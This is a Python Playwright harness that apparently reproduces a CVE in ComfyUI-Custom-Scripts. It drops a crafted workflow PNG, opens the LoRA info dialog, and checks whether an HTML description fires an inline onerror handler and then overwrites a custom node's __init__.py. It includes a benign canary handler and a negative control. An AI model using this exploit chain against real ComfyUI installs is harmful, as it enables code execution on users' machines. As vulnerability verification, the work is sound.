#!/usr/bin/env python3
"""Drive the real ComfyUI in a real browser, as an ordinary user.

This script never imports ComfyUI and never imports Custom-Scripts. It does not
call the vulnerable routes itself -- that is the whole point. It:

  1. opens http://127.0.0.1:8188 in a real chromium (the product's real frontend,
     served by the product's own aiohttp server),
  2. drops a workflow PNG onto the canvas -- ComfyUI's own documented way of
     opening a shared graph -- so a LoraLoader node appears,
  3. right-clicks that node and clicks the "View Lora info..." entry that
     Custom-Scripts adds in web/js/modelInfo.js (getExtraMenuOptions),
  4. waits, and reports what happened.

Every action is a real DOM event. The only introspection is read-only (litegraph's
canvas transform, so the right-click lands on the node). Nothing on the taint path
is stubbed, patched or called directly.

Both phases run in a fresh browser context, so nothing carries over in storage or
cache. The negative control is a byte-comparable artifact whose only difference is
that modelspec.description is plain prose.
"""
import base64
import hashlib
import json
import os
import pathlib
import sys
import time
import urllib.error
import urllib.request

BASE = "http://127.0.0.1:8188"
ROOT = pathlib.Path.home() / "cve_repro_modelspec"
RUN = pathlib.Path(os.environ.get("RUN_DIR", ROOT / "run"))
COMFY = pathlib.Path(os.environ.get("COMFY_ROOT", ROOT / "src/ComfyUI"))
MARKER = pathlib.Path(os.environ.get("MARKER_PATH", RUN / "staged_marker.json"))
VICTIM_PACK = "Victim-Demo-Pack"
VICTIM_INIT = COMFY / "custom_nodes" / VICTIM_PACK / "__init__.py"
STAGED_SHA = os.environ.get("STAGED_SHA", "")
SHOTS = RUN / "shots"
SHOTS.mkdir(parents=True, exist_ok=True)

# Environment control, stated openly: external host names resolve nowhere, loopback
# still works. This reproduces the offline condition the earlier run in this corpus
# achieved with `docker run --network none`. It does NOT touch the audited path --
# the product's own route, its own frontend, its own routes and its own startup
# import all run for real; only the third-party civitai lookup is unreachable, and
# the code path that matters is precisely the `?? this.metadata[...]` fallback that
# an offline install takes.
LAUNCH_ARGS = [
    "--no-sandbox",
    "--disable-dev-shm-usage",
    "--host-resolver-rules=MAP * ~NOTFOUND, EXCLUDE 127.0.0.1",
]


def sha256(p: pathlib.Path) -> str:
    return hashlib.sha256(p.read_bytes()).hexdigest()


def http_headers(path):
    """Is the frontend served with a Content-Security-Policy? An inline event
    handler injected through innerHTML is exactly what a CSP would stop, so this
    separates 'the payload is wrong' from 'the product blocks it'."""
    try:
        with urllib.request.urlopen(BASE + path, timeout=30) as r:
            return {k.lower(): v for k, v in r.headers.items()
                    if k.lower() in ("content-security-policy",
                                     "content-security-policy-report-only",
                                     "x-content-type-options")} or {"csp": "absent"}
    except Exception as e:  # noqa: BLE001
        return {"error": str(e)[:160]}


def state():
    """Everything the driver is allowed to observe about the filesystem."""
    temp_dir = COMFY / "temp"
    uploads = sorted(p.name for p in temp_dir.glob("staged_init*.py")) if temp_dir.exists() else []
    return {
        "victim_init_sha256": sha256(VICTIM_INIT) if VICTIM_INIT.exists() else None,
        "victim_init_is_staged": bool(VICTIM_INIT.exists() and sha256(VICTIM_INIT) == STAGED_SHA),
        "temp_uploads": uploads,
        "marker_exists": MARKER.exists(),
        "marker": json.loads(MARKER.read_text()) if MARKER.exists() else None,
    }


DROP_JS = """
(payload) => {
  const bytes = Uint8Array.from(atob(payload.b64), c => c.charCodeAt(0));
  const file = new File([bytes], payload.name, { type: 'image/png' });
  const dt = new DataTransfer();
  dt.items.add(file);
  const el = document.querySelector('canvas#graph-canvas') || document.querySelector('canvas');
  if (!el) return 'no-canvas';
  const r = el.getBoundingClientRect();
  const opts = { dataTransfer: dt, bubbles: true, cancelable: true,
                 clientX: r.left + r.width / 2, clientY: r.top + r.height / 2 };
  el.dispatchEvent(new DragEvent('dragover', opts));
  el.dispatchEvent(new DragEvent('drop', opts));
  return 'dropped';
}
"""

LOCATE_JS = """
() => {
  const app = window.app || (window.comfyAPI && window.comfyAPI.app && window.comfyAPI.app.app);
  if (!app || !app.graph) return null;
  const n = app.graph._nodes.find(x => /LoraLoader/.test(x.type || ''));
  if (!n) return {nodes: app.graph._nodes.map(x => x.type)};
  const ds = app.canvas.ds;
  const el = app.canvas.canvas;
  const r = el.getBoundingClientRect();
  const x = r.left + (n.pos[0] + 40) * ds.scale + ds.offset[0] * ds.scale;
  const y = r.top  + (n.pos[1] - 10) * ds.scale + ds.offset[1] * ds.scale;
  return {type: n.type, widget: (n.widgets_values || [])[0], x: x, y: y};
}
"""

DOM_JS = """
() => {
  const img = document.querySelector('img[src="x"]');
  const html = [...document.querySelectorAll('div')]
      .map(e => e.innerHTML).filter(h => h.includes('src="x"'));
  return {
    img_present: !!img,
    img_outer_full_len: img ? img.outerHTML.length : null,
    img_attr_len: img ? (img.getAttribute('onerror') || '').length : null,
    onerror_type: img ? typeof img.onerror : null,
    onerror_is_null: img ? img.onerror === null : null,
    img_connected: img ? img.isConnected : null,
    img_same_document: img ? (img.ownerDocument === document) : null,
    img_complete: img ? img.complete : null,
    img_natural_width: img ? img.naturalWidth : null,
    img_current_src: img ? (img.currentSrc || '').slice(0, 90) : null,
    description_html: html.length ? html[html.length - 1].slice(0, 300) : null,
    iframe_present: !!document.querySelector('iframe[srcdoc]'),
    token_vector_a: window.__mbe2e || null,
    token_vector_b: window.__mbe2e2 || null,
    has_dompurify: typeof window.DOMPurify,
    innerHTML_setter_native: (() => {
      const d = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
      return !!d && !!d.set && d.set.toString().includes('[native code]');
    })(),
    trusted_types_default_policy: !!(window.trustedTypes && window.trustedTypes.defaultPolicy),
    meta_csp: (document.querySelector('meta[http-equiv="Content-Security-Policy" i]') || {}).content || null,
  };
}
"""

# Why did the inline handler (not) run? 'onerror === null' after an innerHTML
# assignment is ambiguous: it means either the product neutered the fragment or the
# payload never compiled. Compile the attribute by hand to separate the two, and
# force the event so a slow image load cannot be mistaken for a blocked payload.
# The earlier run in this corpus lost a whole finding to exactly this ambiguity.
HANDLER_DIAG_JS = """
() => {
  const img = document.querySelector('img[src="x"]');
  if (!img) return { error: 'no-img' };
  const attr = img.getAttribute('onerror') || '';
  let compile;
  try { new Function(attr); compile = 'ok'; }
  catch (e) { compile = 'SyntaxError: ' + e.message; }
  return {
    attr_len: attr.length,
    attr_head: attr.slice(0, 80),
    attr_tail: attr.slice(-80),
    compile,
    onerror_type: typeof img.onerror,
    complete: img.complete,
    natural_width: img.naturalWidth,
    current_src: img.currentSrc || null,
    same_document: img.ownerDocument === document,
    connected: img.isConnected,
  };
}
"""

# Hand-inserted control handler. If this does NOT compile and fire, an inline
# handler could not have run at all on this page and a negative result would be
# meaningless. The earlier run in this corpus lost a whole finding to exactly that
# ambiguity, so every browser-side canary here carries the control.
CONTROL_JS = """
() => {
  const d = document.createElement('div');
  d.innerHTML = '<img src=y onerror="window.__lcs_control=1">';
  document.body.appendChild(d);
  const i = d.firstElementChild;
  return {onerror_type: typeof i.onerror, attr: i.getAttribute('onerror'),
          same_doc: i.ownerDocument === document};
}
"""


def phase(page, label, model_name, timeout_ms, expect_payload):
    ev = {"phase": label, "model": model_name, "expect_payload": expect_payload,
          "state_before": state()}

    png = RUN / f"victim_workflow_{label}.png"
    b64 = base64.b64encode(png.read_bytes()).decode()

    page.goto(BASE, wait_until="domcontentloaded")
    page.wait_for_function("() => !!(window.app && window.app.graph)", timeout=timeout_ms)
    ev["drop"] = page.evaluate(DROP_JS, {"b64": b64, "name": png.name})
    page.wait_for_timeout(2500)

    loc = None
    for _ in range(10):
        loc = page.evaluate(LOCATE_JS)
        if loc and "x" in loc:
            break
        page.wait_for_timeout(500)
    if not loc or "x" not in loc:
        page.screenshot(path=str(SHOTS / f"{label}_no_node.png"))
        ev["error"] = "LoraLoader node not present after drop"
        ev["located"] = loc
        return ev
    ev["located"] = {k: loc[k] for k in ("type", "widget")}

    entry = None
    for attempt in range(4):
        page.mouse.click(loc["x"], loc["y"], button="right")
        page.wait_for_timeout(900)
        cand = page.locator("text=View Lora info").first
        if cand.count() > 0:
            entry = cand
            break
        page.keyboard.press("Escape")
        page.wait_for_timeout(300)
    ev["right_click_attempts"] = attempt + 1
    ev["menu_entry_visible"] = entry is not None
    if entry is None:
        page.screenshot(path=str(SHOTS / f"{label}_no_menu.png"))
        ev["error"] = "Custom-Scripts 'View Lora info...' entry not in the node context menu"
        return ev

    entry.click()
    # The description block is only appended after `await addCivitaiInfo()` settles
    # (modelInfo.js:177-195). On a host with no route to civitai.com that fetch hangs
    # in connect, so poll for the rendered result instead of guessing a delay.
    if expect_payload:
        waiter = "() => !!document.querySelector('img[src=\"x\"]') || !!window.__mbe2e"
    else:
        waiter = "() => document.body.innerText.includes('perfectly ordinary LoRA description')"
    try:
        page.wait_for_function(waiter, timeout=60000)
    except Exception:  # noqa: BLE001
        pass
    if expect_payload:
        try:
            page.wait_for_function("() => !!window.__mbe2e", timeout=20000)
        except Exception:  # noqa: BLE001
            pass
    page.wait_for_timeout(2500)

    ev["dom"] = page.evaluate(DOM_JS)
    ev["handler_diag"] = page.evaluate(HANDLER_DIAG_JS)
    ev["token_natural"] = ev["dom"].get("token_vector_a") or ev["dom"].get("token_vector_b")
    # Force the event too: a payload that compiles but whose image never errors must
    # not be readable as "the product blocked it".
    ev["token_forced"] = page.evaluate("""() => {
        const img = document.querySelector('img[src="x"]');
        if (!img) return 'no-img';
        img.dispatchEvent(new Event('error'));
        return (window.__mbe2e || null) || (window.__mbe2e2 || null);
    }""")
    page.wait_for_timeout(3000)
    ev["token_final"] = page.evaluate("() => window.__mbe2e || window.__mbe2e2 || null")
    # control: can an inline handler compile and fire on this page at all?
    ev["inline_handler_control"] = page.evaluate(CONTROL_JS)
    page.wait_for_timeout(1200)
    ev["inline_handler_control_fired"] = page.evaluate("() => window.__lcs_control || null")
    ev["sink_assigned_innerHTML"] = bool(ev["dom"].get("img_present"))
    page.screenshot(path=str(SHOTS / f"{label}_dialog.png"))
    page.wait_for_timeout(1500)
    ev["state_after"] = state()
    return ev


def main() -> int:
    from playwright.sync_api import sync_playwright

    res = {
        "root_key": "comfy.custom_scripts_modelspec_staged_rce",
        "started_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "product": "ComfyUI + ComfyUI-Custom-Scripts",
        "product_commit_observed": os.environ.get("COMFY_SHA"),
        "component_commit_observed": os.environ.get("NODE_SHA"),
        "drive": "playwright chromium vs the real ComfyUI frontend; real drop + right-click + menu click",
        "browser_args": LAUNCH_ARGS,
        "environment_control": "external host names made unresolvable in the browser "
                               "(equivalent to the offline condition of the earlier run in this corpus); "
                               "loopback unaffected",
        "staged_sha256": STAGED_SHA,
        "steps": [],
    }
    res["steps"].append({"step": "0a_csp_headers", "headers": http_headers("/")})

    def on_request(req):
        if "/upload/image" in req.url or "/pysssss/save/" in req.url:
            res["steps"].append({
                "step": "page_originated_request",
                "method": req.method,
                "url": req.url.replace("http://127.0.0.1:8188", ""),
                "post_data": (req.post_data or "")[:300],
            })

    def on_response(resp):
        if "/upload/image" in resp.url or "/pysssss/save/" in resp.url:
            res["steps"].append({
                "step": "page_originated_response",
                "status": resp.status,
                "url": resp.url.replace("http://127.0.0.1:8188", ""),
            })

    with sync_playwright() as p:
        browser = p.chromium.launch(args=LAUNCH_ARGS)
        for label, model, expect in (("negctl", "benign_cs.safetensors", False),
                                     ("attack", "evil_cs.safetensors", True)):
            ctx = browser.new_context()
            page = ctx.new_page()
            page.on("request", on_request)
            page.on("response", on_response)
            msgs = []
            page.on("console", lambda m: msgs.append(f"{m.type}: {m.text}"[:200]))
            page.on("pageerror", lambda e: msgs.append(f"pageerror: {e}"[:200]))
            ev = phase(page, label, model, 90000, expect)
            ev["console_all"] = msgs[:40]
            res["steps"].append(ev)
            ctx.close()
        browser.close()

    by = {s["phase"]: s for s in res["steps"] if "phase" in s}
    neg, att = by["negctl"], by["attack"]
    res["negative_control_clean"] = (
        not neg.get("state_after", {}).get("victim_init_is_staged", False)
        and not neg.get("state_after", {}).get("temp_uploads", [])
        and not neg.get("dom", {}).get("img_present", False)
    )
    res["sink_confirmed"] = bool(att.get("dom", {}).get("img_present")) \
        or bool(att.get("dom", {}).get("iframe_present"))
    res["payload_ran"] = bool(att.get("token_final") or att.get("token_natural"))
    res["which_vector"] = att.get("token_final")
    res["xss_confirmed"] = res["sink_confirmed"] and res["payload_ran"]
    res["staged_overwrite"] = bool(att.get("state_after", {}).get("victim_init_is_staged"))
    res["control_handler_alive"] = (att.get("inline_handler_control") or {}).get("onerror_type") == "function" \
        and bool(att.get("inline_handler_control_fired"))
    res["restart_pending"] = "tested separately by verify_restart.py"
    pathlib.Path(RUN / "drive.json").write_text(
        json.dumps(res, indent=2, sort_keys=True) + "\n", encoding="utf-8")

    ok = res["xss_confirmed"] and res["payload_ran"] and res["staged_overwrite"] \
        and res["negative_control_clean"] and res["control_handler_alive"]
    print(json.dumps({k: v for k, v in res.items() if not isinstance(v, list)}, indent=2, sort_keys=True))
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
